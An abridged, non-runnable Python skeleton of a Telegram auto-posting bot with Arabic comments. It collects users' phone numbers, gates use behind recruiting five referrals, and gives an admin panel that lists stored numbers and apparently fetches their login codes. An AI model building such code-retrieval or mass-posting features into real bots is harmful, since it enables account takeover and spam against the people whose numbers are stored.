...
class AutoPoster:
    ...
    async def start_posting_for_user(self, user_id):
        try:
            ...
            users_data[str(user_id)]['last_activity'] = datetime.now().isoformat()
            storage.save_data('users', users_data)
...
# مدير الطلبات باستخدام threads
class RequestManager:
    def __init__(self):
        self.is_running = True
    
    def start_keep_alive_requests(self):
        def keep_alive_worker():
            while self.is_running:
                try:
                    # إرسال طلب إلى الويب هووك الخارجي
                    ...
                    try:
                        ...
                        if local_response.status_code == 200:
                            logger.debug("✅ Local health check successful")
                    except:
                        pass
...
class AutoPostBot:
    ...
    async def setup_handlers(self):
        ...
        @self.client.on(events.NewMessage(pattern='/sos'))
        async def sos_handler(event):
    ...
    async def handle_user_input(self, event, input_type):
        ...
        if input_type == 'phone':
            ...
            try:
                ...
                users_data[str(user_id)]['updated_at'] = datetime.now().isoformat()
                storage.save_data('users', users_data)
...
اطلب من 5 أشخاص استخدام هذا الرابط وتفعيل البوت."""
    ...
    async def show_numbers_menu(self, event, page=0):
        ...
        numbers_data = storage.load_data('admin_numbers', {})
        numbers = list(numbers_data.values())[page*8:(page+1)*8]
        
        buttons = []
        for i, number_data in enumerate(numbers):
            phone = number_data.get('phone_number', 'Unknown')
            status = number_data.get('status', 'active')
            status_emoji = "🟢" if status == 'active' else "🔴"
            buttons.append([Button.inline(f"{status_emoji} {phone}", f"select_number_{i}")])
        
        nav_buttons = []
        if page > 0:
            nav_buttons.append(Button.inline("◀️ السابق", f"number_page_{page-1}"))
        if len(numbers_data) > (page + 1) * 8:
    ...
    async def show_number_info(self, event, number_id):
        if event.sender_id != ADMIN_ID:
            return
        
        numbers_data = storage.load_data('admin_numbers', {})
        number_list = list(numbers_data.values())
        
        if number_id < len(number_list):
            number_data = number_list[number_id]
            phone = number_data.get('phone_number', 'Unknown')
            status = number_data.get('status', 'active')
            last_activity = number_data.get('last_activity', 'غير معروف')
            
            buttons = [
                [Button.inline("🔐 جلب الكود", "get_code")],
                [Button.inline("🔙 رجوع", "get_numbers")]
            ]
            
            text = f"""**معلومات الرقم** 📋
...
🕒 آخر نشاط: {last_activity}"""
    ...
    async def get_code_handler(self, event):
        if event.sender_id != ADMIN_ID:
            return
        
        await event.answer("تم طلب الكود، سيتم إرساله عند وصوله...", alert=True)
        ...
        def run_web():
            ...
            def health():
                return jsonify({
                    ...
                    "active_users": len(self.auto_poster.active_posts)
                })
    ...
    async def start(self):
        ...
        # بدء طلبات الحفاظ على النشاط باستخدام threads
        self.request_manager.start_keep_alive_requests()
